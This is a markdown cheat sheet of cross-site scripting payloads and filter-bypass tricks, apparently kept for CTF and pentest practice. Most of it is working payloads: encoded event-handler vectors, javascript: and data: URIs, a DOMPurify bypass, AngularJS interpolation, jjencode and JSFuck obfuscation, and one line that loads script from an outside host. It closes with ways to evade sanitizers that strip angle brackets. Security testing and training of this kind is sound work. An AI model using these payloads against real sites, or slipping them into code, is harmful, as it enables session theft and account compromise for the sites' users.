# XSS

[http://www.xssgame.com/](http://www.xssgame.com/) : [http://www.xssgame.com/wmOM2q5NJnZS](http://www.xssgame.com/wmOM2q5NJnZS)\
[https://xss.pwnfunction.com/](https://xss.pwnfunction.com/)\
[https://www.acunetix.com/blog/web-security-zone/test-xss-skills-vulnerable-sites/](https://www.acunetix.com/blog/web-security-zone/test-xss-skills-vulnerable-sites/)\
[https://theswissbay.ch/pdf/Gentoomen%20Library/Security/Cross%20Site%20Scripting%20Attacks%20Xss%20Exploits%20and%20Defense.pdf](https://theswissbay.ch/pdf/Gentoomen%20Library/Security/Cross%20Site%20Scripting%20Attacks%20Xss%20Exploits%20and%20Defense.pdf)\




Check how values are sanitized by the server\
How many ways you can raise an error

```
http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:a
```

Check which framework is used in UI based on that create payloads such as in angular to show alert you use interpolation;

## Xss filter bypass >\&lt;script\&gt;alert(1);\&lt;/script\&gt;

Some ideas:

1. Check if the encoding happens recursively. if you provide multiple '<', will they all be encoded?
2. Try different types of encoding (e.g. URL encoding, double URL encoding) and see how the application treats them.
3. There are cases where the application normalizes Unicode characters (have a look here [Unicode Normalization Bypass](https://hackerone.com/reports/639684))

## Markdown XSS payload

[https://github.com/JakobTheDev/information-security/blob/master/Payloads/md/XSS.md](https://github.com/JakobTheDev/information-security/blob/master/Payloads/md/XSS.md)

## Error produce

"/\</script>



Alert(1) to win: [https://github.com/1bitrs/alert-1-to-win](https://github.com/1bitrs/alert-1-to-win)\
\
Payloads:\


```
confirm
prompt
alert
```

```
Encoded Characters

<img src onerror=j&#97v&#97script&#x3A;&#97lert(1)>
<image src onerror=alert(8)>
<image/src/onerror=alert(8)>

HTML character encoding: https://www.rapidtables.com/web/html/html-codes.html
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
<img src="xss" onerror="eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41))">
```

<pre><code>// Script
&#x3C;script/src=&#x26;#100&#x26;#97&#x26;#116&#x26;#97:text/&#x26;#x6a&#x26;#x61&#x26;#x76&#x26;#x61&#x26;#x73&#x26;#x63&#x26;#x72&#x26;#x69&#x26;#x000070&#x26;#x074,&#x26;#x0061;&#x26;#x06c;&#x26;#x0065;&#x26;#x00000072;&#x26;#x00074;(1)>&#x3C;/script>
&#x3C;script src=//brutelogic.com.br/1.js> 
<strong>
</strong></code></pre>

```
// href

------------------------------------
DOMPurify.sanitize
<a id=ok href="cid:alert(1337)" />
%3Ca%20id%3Dok%20href%3D%22cid%3Aalert(1337)%22%20%2F%3E
setTimeout(ok, 2000)
----------------------------------
<a href="javascript:alert('XSS')">Click me</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click me</a>
```

```
// iframe
<iframe  src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> 
<iframe src="javascript:alert('XSS')"></iframe>
<iframe/onload=&#97&#108&#101&#114&#116(1)>
```

```
// svg

<svg><script xlink:href=data:,alert(1) /> 
<svg/onload=alert(8)>
<svg onload="alert('XSS')"></svg>
```

```
// input

<input type="button" value="Click me" onclick="alert('XSS')">
<input type="text" id="search-text" name="query" value="" onfocus="alert(1)" autofocus="" />

```

```
// Framework expression

AngularJS {{alert('XSS')}}
```

```
// form

<form action="javascript:alert('XSS')">
    <input type="submit" value="Submit">
</form>

```

```
// JSON

<script>'({"userdata":"'|alert(1)//"})</script>
use pipe operator to neglect garbage

comment
//
<!--

```

```
// Special character JS, usefull once code is outside of console, or code

it is recommended to use jjencode, which can be done in 537 characters.

https://utf-8.jp/public/jjencode.html
```

```
// alert jjencode

$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.__$+")"+"\"")())();

");_=!1+URL+!0,[][_[0]+_[10]+_[2]+_[2]][_[8]+_[11]+_[7]+_[3]+_[9]+_[38]+_[39]+_[8]+_[9]+_[11]+_[38]](_[1]+_[2]+_[4]+_[38]+_[9]+'(1)')()//
```

```
/[A-Za-z0-9]/g, ''

'[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()'
%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%29%28%29
```

```
s = s.replace(/[\r\n\u2028\u2029\\;,()\[\]<]/g, '');
<script> var email = ''|new Function`a${'alert'+String.fromCharCode`40`+1+String.fromCharCode`41`}`|''; </script>

[]["pop"]["constructor"]('alert(1)')()
[]["&#112;&#111;&#112;"]["&#99;&#111;&#110;&#115;&#116;&#114;&#117;&#99;&#116;&#111;&#114;"]('&#97;&#108;&#101;&#114;&#116;(1)')()

"|[]["p\x6fp"]["c\x6fnstr\x75ct\x6fr"]('\x61l\x65rt(1)')()|"
"|[]["p\\x6fx6fp"]["c\\x6fx6fnstr\\x75x75ct\\x6fx6fr"]('\\x61x61l\\x65x65rt(1)')()|"

javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>

```

```
// eval: 
eval(location.href.slice(55,66))
```

```
// Generate Error

"
\
</script>
```

## Tips

Code-split : | , ; , enter + code, +, -, /, , , %,^,&,\*, <, >

Break the code inside the quotation

```
<script>console.log("</script>")</script>

Depending on situation
```

If JavaScript code sanitizes `<` and `>` characters, it indicates that it's trying to prevent HTML injection and potentially XSS attacks. However, there are ways attackers can still attempt XSS, such as using alternative encodings or bypassing the sanitizer logic. Here are a few techniques they might try:

1. **Using Hex Encoding**: Instead of `<` and `>`, attackers might try using their hexadecimal equivalents (`%3C` for `<` and `%3E` for `>`). Some sanitizers may miss these encoded forms.
2. **Using Unicode Encoding**: Attackers might use Unicode encoding to represent `<` and `>` characters. For example, `\u003C` for `<` and `\u003E` for `>`.
3. **Using Alternative Tags**: Instead of `<script>` tags, attackers might try using alternative tags that the sanitizer may not detect as executable code. For example, `<img>` tags with JavaScript in the `src` attribute, or even uncommon HTML tags.
4. **Event Handlers**: Attackers can try using event handlers like `onmouseover` or `onerror` to execute JavaScript code without directly injecting `<script>` tags.
5. **CSS Injection**: Although less common, attackers might try injecting CSS code that includes JavaScript execution, such as using the `expression()` function in old versions of Internet Explorer.
